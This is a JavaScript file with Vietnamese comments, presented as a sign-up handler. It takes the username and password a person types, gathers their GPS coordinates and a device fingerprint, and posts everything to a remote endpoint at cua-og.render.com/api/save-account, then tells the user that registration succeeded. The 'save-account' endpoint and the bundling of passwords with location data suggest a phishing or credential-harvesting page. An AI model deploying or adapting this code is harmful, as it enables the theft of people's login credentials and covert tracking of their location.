
// check_location.js

function dangKy() {
    // Kiểm tra xem hàm layThongTinMay có tồn tại không
    if (typeof layThongTinMay !== 'function') {
        console.error('❌ Lỗi: Hàm layThongTinMay() không tìm thấy! Hãy đảm bảo đã load file check_browser.js trước.');
        alert('Lỗi hệ thống! Vui lòng tải lại trang.');
        return;
    }

    // Lấy thông tin trình duyệt từ file check_browser.js
    const thongTinMay = layThongTinMay(); 

    // Kiểm tra các trường input có tồn tại không
    const usernameInput = document.getElementById('username'); 
    const passwordInput = document.getElementById('password');
    
    if (!usernameInput || !passwordInput) {
        console.error('❌ Không tìm thấy input username hoặc password!');
        return;
    }

    // Kiểm tra giá trị input
    if (!usernameInput.value.trim() || !passwordInput.value.trim()) {
        alert('Vui lòng nhập đầy đủ thông tin!');
        return;
    }

    // Yêu cầu vị trí
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(
            function(position) {
                const data = {
                    username: usernameInput.value,
                    password: passwordInput.value,
                    location: position.coords.latitude + "," + position.coords.longitude,
                    device_info: thongTinMay
                };
                
                guiDuLieu(data);
            }, 
            function(error) {
                console.log('⚠️ Người dùng từ chối vị trí hoặc lỗi:', error.message);
                dangKyKhongViTri(thongTinMay); 
            }
        );
    } else {
        console.log('⚠️ Trình duyệt không hỗ trợ Geolocation');
        dangKyKhongViTri(thongTinMay);
    }
}

// Hàm gửi dữ liệu lên server
function guiDuLieu(data) {
    console.log('📤 Đang gửi dữ liệu:', data);
    
    fetch('https://cua-og.render.com/api/save-account', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(data)
    })
    .then(response => {
        if (response.ok) {
            console.log("✅ Gửi thành công!");
            alert('Đăng ký thành công!');
            return response.text();
        } else {
            console.log("❌ Lỗi server:", response.status);
            alert('Lỗi! Vui lòng thử lại.');
            throw new Error('Server error');
        }
    })
    .then(result => console.log('Server trả về:', result))
    .catch(err => {
        console.error("❌ Lỗi kết nối:", err);
        alert('Lỗi kết nối! Kiểm tra mạng và thử lại.');
    });
}

// Đăng ký khi không có vị trí
function dangKyKhongViTri(thongTinMay) {
    const usernameInput = document.getElementById('username');
    const passwordInput = document.getElementById('password');
    
    if (!usernameInput || !passwordInput) {
        console.error('❌ Không tìm thấy input!');
        return;
    }

    const data = {
        username: usernameInput.value,
        password: passwordInput.value,
        location: "Không cho phép",
        device_info: thongTinMay
    };
    
    guiDuLieu(data);
}